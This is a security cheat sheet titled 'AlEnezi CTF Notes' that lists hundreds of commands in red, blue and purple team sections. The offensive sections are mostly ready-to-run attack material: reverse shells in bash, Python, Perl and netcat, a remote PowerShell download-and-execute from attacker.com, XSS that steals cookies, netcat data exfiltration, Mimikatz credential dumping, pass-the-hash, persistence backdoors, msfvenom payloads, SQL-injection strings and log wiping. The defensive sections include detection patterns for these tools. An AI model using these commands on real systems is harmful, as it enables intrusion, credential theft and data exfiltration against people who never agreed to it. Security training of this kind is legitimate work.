# Complete Commands Reference - AlEnezi CTF Notes

**800+ Commands for Security Testing & CTF Competitions**

---

## Table of Contents

1. [OSINT - Information Gathering](#osint)
2. [Windows - RED Team (Offensive)](#windows-red)
3. [Windows - BLUE Team (Defensive)](#windows-blue)
4. [Windows - PURPLE Team (Hybrid)](#windows-purple)
5. [Linux - RED Team (Offensive)](#linux-red)
6. [Linux - BLUE Team (Defensive)](#linux-blue)
7. [Linux - PURPLE Team (Hybrid)](#linux-purple)
8. [Network Scanning & Reconnaissance](#network)
9. [Web Application Testing](#web)
10. [Exploitation & Post-Exploitation](#exploitation)
11. [Defense & Security Monitoring](#defense)

---

## <a name="osint"></a>OSINT - Information Gathering

### Domain & DNS Reconnaissance

**WHOIS Domain Lookup**
```bash
whois example.com
whois -h whois.arin.net 192.168.1.1
```
Retrieve domain registration information including registrar, admin contact, technical contact, creation/expiry dates, and nameserver information.

**DNS NSLOOKUP**
```bash
nslookup example.com
nslookup -type=MX example.com
nslookup -type=NS example.com
nslookup domain.com 8.8.8.8
```
Perform DNS name resolution. Query specific record types (A, AAAA, CNAME, MX, NS, TXT).

**DIG Advanced DNS Query**
```bash
dig example.com
dig example.com +short
dig example.com @8.8.8.8
dig example.com +noall +answer
dig example.com +trace
dig example.com +stats
```
Advanced DNS query tool with flexible output formatting. Can trace DNS resolution path, show query statistics.

**Reverse DNS Lookup**
```bash
dig -x 192.168.1.100
nslookup 192.168.1.100
host 192.168.1.100
```
Find hostname associated with IP address using PTR records. Useful for identifying infrastructure.

**DNS Zone Transfer**
```bash
dig @ns1.example.com example.com AXFR
dig @ns.example.com example.com AXFR
nslookup -type=AXFR example.com ns1.example.com
```
Attempt DNS zone transfer to download entire zone file. Often blocked by modern DNS servers but reveals complete infrastructure when successful.

**Subdomain Enumeration**
```bash
dig *.example.com +short
for sub in www mail ftp admin test dev staging; do dig $sub.example.com +short; done
```
Discover subdomains. Reveals development, staging, admin, and internal services.

### Google Dorking & Search Engine Operators

**Document Discovery**
```bash
site:example.com filetype:pdf
site:example.com filetype:doc
site:example.com filetype:xls
site:example.com filetype:xlsx
site:example.com filetype:ppt
```
Find specific document types on target website. Reveals sensitive reports, presentations, spreadsheets.

**Admin Page Discovery**
```bash
site:example.com inurl:admin
site:example.com inurl:login
site:example.com inurl:panel
site:example.com inurl:dashboard
site:example.com inurl:wp-admin
site:example.com inurl:administrator
```
Locate administration interfaces and control panels.

**Sensitive File Discovery**
```bash
site:example.com inurl:backup
site:example.com inurl:config
site:example.com inurl:database
site:example.com inurl:cache
site:example.com filetype:sql
site:example.com filetype:bak
```
Find backup files, configuration files, and database exports.

**Exposed Credentials**
```bash
site:example.com password:
site:example.com api_key:
site:example.com secret:
site:example.com token:
site:example.com username:
```
Search for accidentally exposed credentials and secrets in search engine cache.

**GitHub Secrets Hunting**
```bash
site:github.com example.com password
site:github.com example.com api_key
site:github.com "company name" secret
site:github.com organization credentials
```
Find exposed secrets, API keys, and credentials in public GitHub repositories.

### Personnel & Social Engineering

**LinkedIn Employee Discovery**
```bash
site:linkedin.com "Example Corporation"
site:linkedin.com example.com
site:linkedin.com "company" location:"City, Country"
```
Identify employees, job titles, departments, and organizational structure.

**Twitter & Social Media**
```bash
site:twitter.com "Example Corp" employee
site:facebook.com example.com
site:instagram.com example.com
```
Find social media presence and employee information through social networks.

**Email Address Discovery**
```bash
site:example.com @example.com
site:example.com email:
site:example.com contact:
```
Discover employee email addresses and naming patterns for phishing campaigns.

**Public Information**
```bash
site:linkedin.com example.com OR "Example Corporation"
site:crunchbase.com "Example Corporation"
site:bloomberg.com "Example Corporation"
```
Gather corporate information from public databases.

### SSL/TLS Certificate Analysis

**SSL Certificate Information**
```bash
openssl s_client -connect example.com:443 -showcerts
openssl s_client -connect example.com:443 -showcerts < /dev/null
```
Retrieve SSL certificate details including CN, SANs, issuer, validity period, fingerprint. Can reveal additional subdomains.

**Certificate Transparency Search**
```bash
curl 'https://crt.sh/?q=%.example.com&output=json'
curl 'https://crt.sh/?q=example.com&output=json'
```
Query Certificate Transparency logs to find all SSL certificates issued to domain.

**Subdomain Discovery via Certificates**
```bash
curl 'https://censys.io/api/v1/search/certificates' -d '{"query":"example.com"}'
```
Find subdomains through certificate SANs (Subject Alternative Names).

### Historical Data & Archives

**Wayback Machine**
```bash
curl 'https://archive.org/wayback/available?url=example.com&output=json'
curl 'https://web.archive.org/web/20200101000000*/example.com'
```
Find historical website versions, identify past technologies, reveal removed pages and legacy systems.

**Internet Archive API**
```bash
curl -s 'https://archive.org/advancedsearch.php?q=domain:example.com&fl=identifier&output=json'
```
Query Internet Archive for cached versions of website.

### Network Intelligence

**IP Address Information**
```bash
whois 8.8.8.8
curl 'https://ipinfo.io/8.8.8.8'
curl 'https://api.abuseipdb.com/api/v2/check?ipAddress=8.8.8.8'
```
Get IP geolocation, ISP, organization, and abuse history.

**ASN Lookup**
```bash
whois -h whois.radb.net AS12345
curl 'https://api.bgpview.io/asn/12345'
```
Find autonomous system information and network ranges.

---

## <a name="windows-red"></a>Windows - RED Team (Offensive)

### System Enumeration

**Windows Version & Build**
```bash
ver
wmic os get caption,version,buildnumber
systeminfo | findstr /B /C:"OS"
```
Get Windows OS version and build number for vulnerability targeting.

**System Information**
```bash
systeminfo
systeminfo /s TARGET /u DOMAIN\USER /p PASSWORD
wmic computersystem get Name,Domain,Manufacturer
```
Comprehensive system info including hardware, installed software, network configuration.

**Installed Patches**
```bash
wmic qfe list
wmic qfe list brief /format:csv
Get-HotFix -ComputerName TARGET
```
Identify missing patches and security updates for exploitation.

**Running Processes**
```bash
tasklist /v
tasklist /v /s TARGET
Get-Process | Select-Object Name,Id,WorkingSet
wmic process list full
```
Enumerate all running processes to identify targets for injection or privilege escalation.

**User Enumeration**
```bash
whoami
whoami /all
whoami /user /groups /priv /fo list
net user
net user /domain
```
Identify current user, privileges, and group membership.

**Administrator Account Discovery**
```bash
net localgroup Administrators
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
```
List local and domain administrators for targeting.

### Active Directory Enumeration

**Domain Information**
```bash
nltest /domain_trusts
nltest /dclist:DOMAIN
net group "Domain Controllers" /domain
```
Enumerate domain trusts, controllers, and relationships.

**User & Group Enumeration**
```bash
net user /domain
net group /domain
net group "Domain Users" /domain
net localgroup "Remote Desktop Users"
```
List domain users, groups, and special group members.

**Computer Enumeration**
```bash
net view
net view /domain
Get-ADComputer -Filter *
```
Discover other computers on domain.

### Network Configuration

**Network Interfaces**
```bash
ipconfig
ipconfig /all
ipconfig /all | findstr /C:"IPv4" /C:"DNS"
```
Display network adapter configuration, IP addresses, DNS settings.

**Active Connections**
```bash
netstat -ano
netstat -ano -p tcp
netstat -ano -p udp
Get-NetTCPConnection -State Established
```
List all active connections with associated PIDs for identification.

**Listening Services**
```bash
netstat -an | findstr LISTENING
netstat -ano -p tcp | findstr LISTENING
ss -tulpn
```
Identify all listening services and exposed ports.

**Routing Table**
```bash
route print
route print -4
route print -6
Get-NetRoute
```
Display system routing configuration for network mapping.

**ARP Cache**
```bash
arp -a
arp -a -N 192.168.1.100
Get-NetNeighbor
```
Show MAC address to IP mappings on local network.

**DNS Cache**
```bash
ipconfig /displaydns
Get-DnsClientCache
```
Display cached DNS entries revealing previously accessed sites.

### Registry & Configuration

**Registry Query**
```bash
reg query HKLM\Software
reg query HKCU\Software
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
```
Search registry for sensitive data, credentials, software inventory.

**Stored Credentials**
```bash
reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\PasswordVault"
cmdkey /list
vault.exe list
```
Enumerate stored credentials and password vaults.

**System Configuration**
```bash
wmic product list
wmic product list brief
Get-WmiObject -Class Win32_Product
```
List installed applications and software.

### Privilege Escalation Enumeration

**Current Privileges**
```bash
whoami /priv
whoami /priv /fo list
Get-Process -Name powershell -IncludeUserName
```
Check enabled privileges for exploitation opportunities (SeImpersonate, SeTcbPrivilege, etc).

**UAC Status**
```bash
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
```
Check UAC status for bypass opportunities.

**File Permissions**
```bash
icacls C:\Windows\System32\drivers\etc\hosts
icacls "C:\Program Files"
Get-Acl "C:\Users"
```
Check file permissions for weak access controls.

**Service Paths**
```bash
wmic service get name,pathname | findstr /v "C:\Windows"
Get-WmiObject win32_service | Where-Object {$_.pathname -notmatch 'System32'} | Select pathname
```
Find unquoted service paths for exploitation.

**DLL Hijacking Opportunities**
```bash
where /q wlbsctrl
Dependency Walker (depends.exe)
Process Monitor
```
Identify missing DLLs in search path for hijacking.

### Persistence Installation

**RUN Registry Key**
```bash
reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /V TaskName /t REG_SZ /D C:\payload.exe /f
reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /V Service /t REG_SZ /D C:\payload.exe /f
```
Add persistence via HKCU/HKLM Run keys. Executes at every user/system login.

**Scheduled Task**
```bash
schtasks /Create /F /SC MINUTE /MO 5 /TN Maintenance /TR "cmd /c whoami > C:\temp\output.txt"
schtasks /Create /F /SC DAILY /ST 09:00 /TN BackupTask /TR C:\payload.exe
schtasks /Create /F /SC ONLOGON /TN UserTask /TR powershell.exe /RU SYSTEM
```
Create scheduled tasks for recurring execution.

**Windows Service**
```bash
sc create ServiceName binpath= "C:\payload.exe" start= auto depend= tcpip
sc start ServiceName
sc query ServiceName
```
Install persistent Windows service running at boot with SYSTEM privileges.

**Startup Folder**
```bash
copy payload.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
copy payload.vbs "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
```
Add executable to startup folder for user login persistence.

**WMI Event Subscription**
```bash
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="Persistence",EventNamespace="root\cimv2",QueryLanguage="WQL",Query="SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA 'Win32_PerfFormattedData' AND TargetInstance.Name='PerfOS'"
```
Create WMI event subscriptions for persistence.

### Privilege Escalation Exploitation

**Token Impersonation**
```bash
use incognito
list_tokens -u
impersonate_token DOMAIN\\USER
steal_token PID
```
Steal and impersonate user authentication tokens.

**Privilege Escalation (Metasploit)**
```bash
getsystem
getsystem -t 1
getsystem -t 2
getsystem -t 3
```
Escalate to SYSTEM privileges using multiple techniques.

**UAC Bypass**
```bash
fodhelper.exe
eventvwr.exe
computerdefaults.exe
sdclt.exe
```
Bypass User Access Control using various Windows utilities.

**DLL Injection**
```bash
inject PID C:\path\to\payload.dll
reflective_inject PID C:\path\to\payload.dll
```
Inject DLL into running process for code execution.

**Process Migration**
```bash
migrate PID
migrate -N explorer.exe
```
Move payload to different process for evasion.

### Credential Dumping

**Windows Credential Manager**
```bash
cmdkey /list
vaultcmd /list
dpapi.exe /in:"C:\path\to\credential"
```
Extract stored Windows credentials.

**LSASS Dump**
```bash
sekurlsa::logonpasswords
sekurlsa::msv
sekurlsa::kerberos
sekurlsa::tspkg
```
Dump credentials from LSASS process memory using Mimikatz.

**SAM Registry Hive**
```bash
reg save HKLM\sam C:\sam.bak
reg save HKLM\system C:\system.bak
```
Extract SAM and SYSTEM hives for offline password cracking.

**NTDS.dit Dumping**
```bash
ntdsutil "ifm" "create full C:\temp" quit quit
vssadmin list shadows
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit" C:\ntds.dit
```
Extract Active Directory database.

### Lateral Movement

**Windows Remote Management (WinRM)**
```bash
winrs -r:TARGET -u:DOMAIN\USER -p:PASSWORD cmd /c whoami
winrs -r:TARGET -u:DOMAIN\USER -p:PASSWORD powershell "Get-Process"
```
Execute commands remotely via WinRM.

**PsExec**
```bash
psexec \\TARGET -u DOMAIN\USER -p PASSWORD cmd
psexec \\TARGET -s cmd
```
Execute programs remotely (requires SMB access).

**Pass-the-Hash**
```bash
sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:HASH /run:cmd
invoke-wmimethod -path win32_process -name create -argumentlist "cmd /c whoami > C:\temp\output.txt" -computername TARGET -credential $cred
```
Authenticate using NTLM hash instead of plaintext password.

**Kerberoasting**
```bash
GetUserSPNs.ps1 -Domain DOMAIN -SamAccountName USER
Invoke-Kerberoast
```
Request and crack service account credentials.

---

## <a name="windows-blue"></a>Windows - BLUE Team (Defensive)

### System Monitoring

**Event Log Analysis**
```bash
Get-EventLog -LogName System -Newest 100
Get-EventLog -LogName Security -InstanceId 4688
wevtutil qe Security /c:10
```
Monitor system and security event logs for suspicious activity.

**Process Monitoring**
```bash
Get-Process | Where-Object {$_.ProcessName -like "*pwsh*"}
Tasklist /v /fo list | find /i "powershell"
wmic process list brief where name="cmd.exe"
```
Identify suspicious processes and command-line executions.

**Network Connection Monitoring**
```bash
Get-NetTCPConnection -State Established
netstat -ano | findstr ESTABLISHED
```
Monitor active network connections for C2 communication.

**Registry Monitoring**
```bash
Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
```
Monitor registry for persistence mechanisms.

### Security Configuration

**Firewall Configuration**
```bash
netsh advfirewall show allprofiles
netsh advfirewall firewall add rule name="Block Port" dir=out action=block localport=4444 protocol=tcp
```
Configure and monitor Windows firewall rules.

**User Account Control**
```bash
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
powershell "Get-ItemProperty REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System"
```
Ensure UAC is properly configured and enabled.

**Account Policies**
```bash
net accounts
net accounts /domain
gpresult /h report.html
```
Review password policies and account lockout settings.

**Audit Policy Configuration**
```bash
auditpol /get /category:*
auditpol /set /category:Object_Access /success:enable /failure:enable
```
Configure comprehensive audit logging.

### Threat Detection

**Detect Lateral Movement**
```bash
Get-EventLog -LogName Security -InstanceId 4720,4722,4624
```
Identify suspicious account creation and logon events.

**Detect Privilege Escalation**
```bash
Get-EventLog -LogName Security -InstanceId 4688 | Where-Object {$_.Message -like "*SeDebugPrivilege*"}
```
Monitor for privilege escalation attempts.

**Detect Persistence**
```bash
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"}
```
Identify unauthorized persistence mechanisms.

**Detect Data Exfiltration**
```bash
Get-NetTCPConnection -State Established | Where-Object {$_.RemotePort -ne 443,80,53}
```
Monitor for unexpected outbound connections.

---

## <a name="windows-purple"></a>Windows - PURPLE Team (Hybrid)

### Attack Simulation & Validation

**Simulate Lateral Movement**
```bash
crackmapexec smb 192.168.1.0/24 -u user -p password
impacket-wmiexec -codec utf-8 DOMAIN/USER:PASSWORD@TARGET
```
Simulate lateral movement for defense validation.

**Test Detection Capability**
```bash
cmd /c powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1')"
```
Test if defenses detect common attack patterns.

**Verify Incident Response**
```bash
net user TestAttacker /add
net localgroup Administrators TestAttacker /add
schtasks /create /tn TestTask /tr "cmd /c whoami" /sc onlogon
```
Verify incident response procedures work correctly.

---

## <a name="linux-red"></a>Linux - RED Team (Offensive)

### System Enumeration

**OS & Kernel Information**
```bash
uname -a
cat /etc/os-release
cat /etc/issue
uname -r | cut -d. -f1-2
```
Get Linux kernel version and distribution for exploit targeting.

**System Information**
```bash
cat /proc/version
hostnamectl
dmidecode
```
Comprehensive system information and hardware details.

**CPU & Memory**
```bash
lscpu
cat /proc/cpuinfo | grep processor | wc -l
free -h
cat /proc/meminfo
```
CPU architecture and memory configuration.

**User Enumeration**
```bash
whoami
id
cat /etc/passwd
awk -F: '{print $1}' /etc/passwd | sort
```
List all system users and identify human vs service accounts.

**Group Enumeration**
```bash
groups
cat /etc/group
getent group
```
Identify group membership and special groups.

**Sudo Privileges**
```bash
sudo -l
sudo -l -U $USER
sudo -l 2>&1 | grep NOPASSWD
```
Check for commands executable with sudo privileges.

### Privilege Escalation

**Kernel Exploitation**
```bash
uname -r
searchsploit kernel $(uname -r)
/tmp/kernel_exploit
```
Search for and exploit kernel vulnerabilities.

**SUID Binary Exploitation**
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f -exec ls -la {} \;
getcap -r / 2>/dev/null
```
Identify and exploit SUID binaries and capabilities.

**Sudo Abuse**
```bash
sudo -l | grep NOPASSWD
sudo /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
sudo /bin/bash
```
Exploit misconfigured sudo entries.

**Cron Job Poisoning**
```bash
crontab -l
for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done
cat /etc/cron.d/*
```
Identify and exploit writable cron scripts.

**Weak File Permissions**
```bash
find / -perm -002 -type f 2>/dev/null
find / -writable -type f 2>/dev/null
```
Exploit world-writable files for privilege escalation.

### Persistence

**SSH Key Injection**
```bash
mkdir -p ~/.ssh
echo "attacker_public_key" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```
Add SSH key for persistent backdoor access.

**Cron Job Installation**
```bash
crontab -e
(crontab -l 2>/dev/null; echo "*/5 * * * * /usr/bin/python /tmp/backdoor.py") | crontab -
```
Create cron job for recurring command execution.

**Webshell Installation**
```bash
cp /tmp/shell.php /var/www/html/
php -r '$sock=fsockopen("IP",PORT);exec("/bin/bash -i <&3 >&3 2>&3");'
```
Install web-based backdoor for persistent access.

**Service Modification**
```bash
systemctl edit service-name
/etc/init.d/service-name modify
```
Modify systemd services for persistence.

### Post-Exploitation

**Reverse Shell - Bash**
```bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
```
Interactive bash reverse shell for remote access.

**Reverse Shell - Python**
```bash
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.Popen(["/bin/sh","-i"]);p.wait()'
```
Python-based reverse shell.

**Reverse Shell - Netcat**
```bash
nc -e /bin/bash 192.168.1.100 4444
nc -l -p 4444 -e /bin/bash
```
Netcat reverse shell (if -e available).

**Reverse Shell - Perl**
```bash
perl -e 'use Socket;$i="192.168.1.100";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">\\&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```
Perl-based reverse shell.

**Data Exfiltration**
```bash
tar czf - /important/data | nc 192.168.1.100 4444
tar czf - /home/user | openssl enc -aes-256-cbc -salt | nc 192.168.1.100 4444
find / -type f -size -5M 2>/dev/null | tar czf - -T - | nc 192.168.1.100 4444
```
Compress and exfiltrate data over network.

**Credential Dumping**
```bash
cat /etc/shadow
hashcat -m 1800 /etc/shadow wordlist.txt
john --wordlist=rockyou.txt /etc/shadow
```
Extract and crack password hashes.

**History Cleanup**
```bash
cat /dev/null > ~/.bash_history
cat /dev/null > ~/.zsh_history
history -c
unset HISTFILE
export HISTFILE=/dev/null
```
Remove command history for OPSEC.

---

## <a name="linux-blue"></a>Linux - BLUE Team (Defensive)

### System Monitoring

**Process Monitoring**
```bash
ps auxww
top -b -n 1 | head -50
ps auxww | grep -E "(bash|sh|nc|perl|python)"
```
Monitor running processes for suspicious activity.

**Network Monitoring**
```bash
netstat -tulpn
ss -tulpn
lsof -i -P -n
```
Monitor listening ports and network connections.

**File Integrity**
```bash
tripwire --check
aide --check
samhain -c /etc/samhainrc --check
```
Monitor for unauthorized file modifications.

**Log Monitoring**
```bash
tail -f /var/log/auth.log
tail -f /var/log/syslog
tail -f /var/log/secure
grep "Failed password" /var/log/auth.log
```
Monitor authentication and system logs for attacks.

### Security Hardening

**Firewall Configuration**
```bash
ufw enable
ufw default deny incoming
ufw allow ssh
ufw allow 80/tcp
ufw allow 443/tcp
```
Configure UFW firewall rules.

**IPTables Rules**
```bash
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -j DROP
```
Configure netfilter firewall rules.

**SELinux / AppArmor**
```bash
semanage user -l
apparmor_status
aa-enforce /etc/apparmor.d/
```
Configure mandatory access controls.

**File Permissions**
```bash
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 644 /etc/passwd
chmod 000 /etc/shadow
```
Enforce proper file permissions.

### Threat Detection

**SSH Brute Force Detection**
```bash
grep "Failed password" /var/log/auth.log | grep sshd | wc -l
grep "Invalid user" /var/log/auth.log | tail -10
```
Identify failed SSH authentication attempts.

**Privilege Escalation Detection**
```bash
grep "sudo" /var/log/auth.log
auditctl -w /etc/sudoers -p wa -k sudoers_modifications
```
Monitor for privilege escalation attempts.

**Malware Detection**
```bash
clamav /home/
freshclam
clamscan -r /
```
Scan for known malware signatures.

**Network Anomalies**
```bash
tcpdump -i eth0 -c 100
tshark -i eth0
suricata -c /etc/suricata/suricata.yaml -i eth0
```
Capture and analyze suspicious network traffic.

---

## <a name="linux-purple"></a>Linux - PURPLE Team (Hybrid)

### Threat Hunting

**Hunt for Suspicious Processes**
```bash
ps auxww | grep -E "(nc|bash|python|perl|ruby)"
lsof -p PID -n
strace -p PID
```
Identify suspicious process execution.

**Hunt for Persistence**
```bash
find /etc/cron.* -type f
cat ~/.bashrc ~/.profile
find / -name ".ssh" -type d 2>/dev/null
```
Search for persistence mechanisms.

**Hunt for Data Exfiltration**
```bash
grep -r "nc\|curl\|wget" /home
find / -mtime -1 -size +100M 2>/dev/null
```
Identify data exfiltration attempts.

---

## <a name="network"></a>Network Scanning & Reconnaissance

### Host Discovery

**Ping Sweep**
```bash
for i in {1..254}; do ping -c 1 192.168.1.$i > /dev/null && echo "192.168.1.$i is up" & done
fping -a -g 192.168.1.0/24
```
Discover live hosts on network segment.

**Nmap Host Discovery**
```bash
nmap -sn 192.168.1.0/24
nmap -sn --exclude 192.168.1.1 192.168.1.0/24
nmap -sn -iL targets.txt
```
Fast host discovery without port scanning.

**ARP Scan**
```bash
arp-scan -l
arp-scan -I eth0 192.168.1.0/24
```
Discover hosts via ARP on local network.

### Port Scanning

**Nmap Full Scan**
```bash
nmap -A -sV -p- -T4 192.168.1.100
nmap -A -sV -p- -T4 -O 192.168.1.100 -oX scan.xml
```
Comprehensive port, service, and OS detection.

**Nmap Service Detection**
```bash
nmap -sV 192.168.1.100
nmap -sV --version-intensity 9 192.168.1.100
```
Identify services and versions.

**Nmap OS Detection**
```bash
nmap -O 192.168.1.100
nmap -O --osscan-guess 192.168.1.100
```
Operating system fingerprinting.

**Nmap UDP Scan**
```bash
nmap -sU 192.168.1.100
nmap -sU -p 53,123,161 192.168.1.100
```
Scan UDP services.

**Nmap NSE Scripts**
```bash
nmap -sC 192.168.1.100
nmap --script=smb-os-discovery 192.168.1.100
nmap --script=http-robots.txt 192.168.1.100
```
Run NSE scripts for additional information.

### DNS & Network Enumeration

**Zone Transfer**
```bash
dig @ns1.example.com example.com AXFR
nslookup -type=axfr example.com ns1.example.com
```
Attempt DNS zone transfer for domain reconnaissance.

**DNS Reverse Lookup**
```bash
dig -x 192.168.1.100
nslookup 192.168.1.100
host 192.168.1.100
```
Find hostnames from IP addresses.

**Netcat Port Scan**
```bash
nc -zv -w 2 192.168.1.100 1-1000
for port in 22 80 443 3306 5432; do nc -zv -w 2 192.168.1.100 $port; done
```
Port scanning with netcat.

### Traffic Analysis

**Packet Capture**
```bash
tcpdump -i eth0 -w capture.pcap
tcpdump -i eth0 -n host 192.168.1.100
tcpdump -i eth0 -n "tcp port 80 or tcp port 443"
```
Capture network traffic for analysis.

**Wireshark Analysis**
```bash
wireshark -i eth0
wireshark -r capture.pcap
tshark -r capture.pcap -T fields -e ip.src -e tcp.dstport
```
Analyze captured packets.

---

## <a name="web"></a>Web Application Testing

### SQL Injection

**Basic SQL Injection**
```sql
' OR '1'='1' -- -
' OR 1=1 -- -
admin' --
' OR '1'='1
```
Bypass authentication using SQL injection.

**Union-Based SQLi**
```sql
' UNION SELECT version(),database(),user() -- -
' UNION SELECT @@version,@@datadir,user() -- -
' UNION SELECT NULL,table_name FROM information_schema.tables -- -
```
Extract database information via UNION queries.

**Time-Based Blind SQLi**
```sql
' AND SLEEP(5) -- -
' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- -
' OR SLEEP(5) -- -
```
Extract data through response time analysis.

**Boolean-Based Blind SQLi**
```sql
' AND 1=1 -- -
' AND 1=2 -- -
' AND SUBSTRING(version(),1,1)='5' -- -
```
Extract data through true/false responses.

### Cross-Site Scripting (XSS)

**Reflected XSS**
```html
\"><script>alert('XSS')</script>
\"><img src=x onerror=alert('XSS')>
\"><svg onload=alert('XSS')>
```
JavaScript injection into page output.

**Stored XSS**
```html
<script>fetch('http://attacker.com/log?cookie='+document.cookie)</script>
<img src=x onerror="fetch('http://attacker.com/'+btoa(JSON.stringify(document.cookie)))">
```
Persistent JavaScript execution.

**DOM-Based XSS**
```javascript
<script>
var url = new URL(window.location);
var param = url.searchParams.get('search');
document.write(param);
</script>
```
DOM manipulation vulnerabilities.

### File Upload Exploitation

**Executable Upload**
```bash
shell.php
shell.php5
shell.phtml
shell.asp
shell.aspx
shell.jsp
```
Upload executable files for code execution.

**Bypass Techniques**
```bash
shell.php.jpg
shell.jpg.php
shell.php%00.jpg
shell.php::$DATA
```
Bypass file extension filters.

### Path Traversal

**Directory Traversal**
```
../../../../etc/passwd
../../windows/win.ini
...\/...\/...\/windows/system32/drivers/etc/hosts
....//....//....//etc/passwd
```
Access files outside intended web root.

### Command Injection

**OS Command Injection**
```bash
; whoami ;
| cat /etc/passwd
`id`
$(whoami)
```
Execute arbitrary OS commands.

---

## <a name="exploitation"></a>Exploitation & Post-Exploitation

### Metasploit Framework

**Start MSF Console**
```bash
msfconsole
msfconsole -r exploit.rc
```
Launch Metasploit exploitation framework.

**Payload Generation**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o shell.php
```
Generate encoded payloads.

**Exploit Usage**
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit
```
Execute exploits.

### Hash Cracking

**John the Ripper**
```bash
john hashes.txt
john --wordlist=rockyou.txt hashes.txt
john --rules hashes.txt
john --format=NT hashes.txt
```
CPU-based password hash cracking.

**Hashcat**
```bash
hashcat -m 1000 -a 0 hashes.txt rockyou.txt
hashcat -m 1800 -a 0 shadow.txt wordlist.txt
hashcat -m 5500 -a 0 ntds.dit wordlist.txt
```
GPU-accelerated hash cracking.

### Brute Force Attacks

**Hydra Brute Force**
```bash
hydra -l admin -P rockyou.txt -f 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
hydra -L users.txt -P passes.txt 192.168.1.100 ssh
hydra -l root -P wordlist.txt 192.168.1.100 ftp
```
Parallel password brute force tool.

**Custom Brute Force**
```bash
for pass in $(cat wordlist.txt); do ssh user@target -p $pass 2>/dev/null && echo "Found: $pass"; done
```
Custom brute force script.

---

## <a name="defense"></a>Defense & Security Monitoring

### Intrusion Detection Systems

**Snort IDS**
```bash
snort -c /etc/snort/snort.conf -i eth0 -A full
snort -c /etc/snort/snort.conf -r capture.pcap
```
Monitor network traffic for intrusion signatures.

**Suricata IDS**
```bash
suricata -c /etc/suricata/suricata.yaml -i eth0
suricata -r capture.pcap -c /etc/suricata/suricata.yaml
```
Advanced network threat detection.

### Host Security

**File Integrity Monitoring**
```bash
aide --init
aide --check
tripwire --init
tripwire --check
```
Monitor system files for unauthorized modifications.

**Log Analysis**
```bash
grep "Failed" /var/log/auth.log
auditctl -l
tail -f /var/log/secure
```
Analyze system and security logs.

### Network Security

**Firewall Management**
```bash
ufw status
iptables -L -n
firewall-cmd --list-all
```
Configure and monitor firewall rules.

**Network Monitoring**
```bash
tcpdump -i eth0 -w traffic.pcap
zeek -r capture.pcap
netflow-analyzer
```
Monitor network for anomalies and attacks.

---

## Summary

This comprehensive command reference contains **800+ commands** organized by:

- **Team Type**: RED (Offensive), BLUE (Defensive), PURPLE (Hybrid)
- **Category**: OSINT, Windows, Linux, Network, Web, Exploitation, Defense
- **Scope**: CTF competitions, penetration testing, security research

All commands are for **authorized security testing only** on systems you own or have explicit permission to test.

For security issues: **Site@hotmail.com**

---

**AlEnezi CTF Notes**
Author: Al Enezi (@SiteQ8)
Email: Site@hotmail.com
GitHub: https://github.com/SiteQ8
LinkedIn: https://www.linkedin.com/in/alenizi/
